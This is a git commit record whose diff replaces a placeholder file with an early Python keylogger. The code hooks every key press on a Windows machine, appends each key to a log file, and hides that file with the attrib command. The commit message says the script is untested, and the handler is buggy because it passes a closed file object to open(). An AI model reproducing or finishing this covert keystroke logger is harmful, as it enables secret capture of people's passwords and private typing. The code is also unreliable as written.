ee3988f7b2c1f731968829cc57f4aac3c76b0529
Fadi1089 <fadi.soltan1089@gmail.com>
2024-06-21 20:05:38 +0200

    Creating the initial keylogging mechanism
    The script is still not tried, the function in line 21 still needs figuring out

--- keylogger.py
+++ keylogger.py
@@ -1,5 +1,21 @@
-print("this is a keylogger")
+import keyboard
+import subprocess
 
-x = "keylooger"
+def on_key_press(event):
+    with open(log, "a") as file:
+        file.write("{}\n".format(event.name))
 
-print(x)
+
+# Creating the log file nad hiding it
+log = open("C:/Users/fadis/.log.txt", "x")
+subprocess.run(["attrib", "+H", "C:/Users/fadis/.log.txt"], check=True)
+
+# Writing the First line to the log file and closes it
+log.write("Beginning of logfile")
+log.close()
+
+# Registering the Keystrokes
+keyboard.on_press(on_key_press)
+
+# Review what the fuck this line does
+keyboard.wait()
